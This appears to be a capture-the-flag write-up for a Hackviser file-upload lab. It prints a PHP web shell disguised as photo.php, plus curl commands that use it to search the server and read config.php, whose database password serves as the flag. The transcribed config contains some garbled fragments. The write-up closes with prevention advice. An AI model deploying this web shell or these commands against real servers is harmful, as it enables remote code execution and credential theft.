
---

# Unrestricted File Upload Challenge writeup

## Introduction
In this writeup I will guide you through on identifying the vulnerability and uploading a malicious file to obtain access to server files

## Objective
This lab contains a Unrestricted File Upload vulnerability. The application has an image upload function, but the uploaded file content or type is not checked on the server.

To complete the lab, upload a malicious PHP script and read the "config.php" file.

What is the database password in the config.php file?

## Example website
```
https://correct-phoenix.europe1.hackviser.space/ 
```
The link will change/be different for you

## Tools used

- **Web Browser/Curl:** 
- **PHP Script:** 
- **Command Line Tools:**

---

## Steps to Exploit

### Step 1: Crafting the Malicious File

Firstly when accessing the site playing around with the website then seeing the page source it had no method in validating the file and file extension (ex: png, jpg, & ect)

With that we create a malicious file to upload onto the website

```php
<?php
  echo shell_exec($_GET['cmd']);
?>
```
The script itself allows us to use the file to execute cmd/terminal commands through accessing the file through the uploaded link 

I saved this as `photo.php` to exploit the improper validation of file extensions

---

### Step 2: Uploading the Malicious File

Using the website's upload feature I uploaded `photo.php` The application processed the file without error showing us success in "bypassing the file validation system"

If you didnt notice already the link extension to the uploaded files is `/uploads/`

---

### Step 3: Executing the Malicious File

With the script uploaded I accessed via link

```plaintext
https://correct-phoenix.europe1.hackviser.space/uploads/photo.php
```

To test I used the command command `https://correct-phoenix.europe1.hackviser.space/uploads/photo.php?cmd=ls` to list the directory files to view other files previously uploaded or not accessible by a normal user

It worked meaning we can execute terminal commands onto the server

---

### Step 4: Locating the config.php File

To locate the `config.php` file I used the `find` command that scans the entire server for the file name

```bash
find / -type f -name "config.php" 2>/dev/null
```

```bash
curl 'https://correct-phoenix.europe1.hackviser.space/uploads/photo.php?cmd=find%20/%20-type%20f%20-name%20%22config.php%22%202%3E/dev/null'
```

This command located the file at `/var/www/html/config.php`

---

### Step 5: Reading the config.php File

Finally we can read the contents of the target file `config.php` using:

```bash
curl 'https://correct-phoenix.europe1.hackviser.space/uploads/photo.php?cmd=cat%20/var/www/html/config.php'
```

This gives us the output of the php file containing the database information stored within the file

```php
‹?php
tryt
$host = 'localhost';
$db_name = 'hv_database' ;
$charset = 'utf8';
$username = 'root';
$password = '8jv77mvXwR7LVU5v ' ;
$db = new PDO ("mysql:host=$host;dbname=$db_name; charset=$charset", Susern
ame, $password);
} catch (PDOException $e){
}
?>
```

---

# Flag

```
8jv77mvXwR7LVU5v
```

---

## Recommendations to prevent this happening

- **Validate file types both by extension and MIME types**
- **Implement file content checking to prevent malicious uploads**
- **Restrict executable permissions in upload directories**

---

